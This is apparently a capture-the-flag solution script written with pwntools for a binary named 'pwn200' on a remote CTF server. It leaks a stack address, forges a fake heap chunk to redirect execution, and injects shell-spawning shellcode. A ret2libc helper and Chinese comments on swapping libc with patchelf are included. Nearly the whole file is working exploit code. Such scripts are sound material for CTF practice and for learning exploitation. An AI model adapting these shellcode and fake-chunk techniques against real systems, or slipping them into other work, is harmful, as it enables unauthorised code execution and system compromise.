from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './pwn200'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',26569) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()

def checkin(num,money):
	sla(b'your choice', b'1')
	sla(b'how long?\n',int2bytes(num))
	sa(int2bytes(num)+b'\n',money)
def checkout():
	sla(b'your choice', b'2')
def quit():
	sla(b'your choice', b'3')
# start
#input name  -- get rbp_addr
payload = asm(shellcraft.amd64.sh()).ljust(0x30)
ru(b'who are u?\n')
s(payload)
ru(payload)
rbp_addr = uu64(ru(b'\x7f',drop=False)[-6:].ljust(8,b'\x00'))
log.success('rbp_addr '+ hex(rbp_addr))
shellcode_addr = rbp_addr - 0x50
fake_chunk_addr = rbp_addr - 0x90 - 0x10


#input id -- next chunk size
sla(b'give me your id',b'32')

#input money
payload = p64(0)*2 + p64(0) + p64(0x51)
payload = payload.ljust(0x38,b'\x00') + p64(fake_chunk_addr)
sa(b'give me money',payload)

#free and malloc
checkout()
# dbg()
payload = b'a'*0x28 + p64(shellcode_addr)
payload = payload.ljust(0x30,b'\x00')
checkin(0x40, payload)

quit()
# end
itr()